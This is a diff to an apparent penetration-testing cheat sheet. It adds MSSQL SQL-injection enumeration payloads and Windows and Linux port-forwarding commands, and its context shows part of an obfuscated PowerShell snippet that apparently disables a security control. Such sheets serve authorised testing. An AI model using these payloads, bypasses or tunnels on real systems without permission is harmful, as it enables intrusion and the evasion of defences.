@@ -19,6 +19,8 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 
 [sql injection: mssql]
+>> group_concat for mssql
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
 >> find available databases
 convert(int,db_name(5))
 db_name(db_id)
@@ -1080,3 +1082,11 @@ GetField([string](38..51|%{[char][int](29+($A+$B).
 substring(($_*2),2))})-replace " ",'NonPublic,Static').
 SetValue($null,$true)
 ```
+
+[port forward]
+>> Windows
+netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=443 connectaddress=192.168.99.23 connectport=443
+>> Linux
+ssh -L 8888:127.0.0.1:8888 sshuser@10.10.10.10
+ssh -R 8888:127.0.0.1:8888 sshuser@10.10.10.10
+>> socat
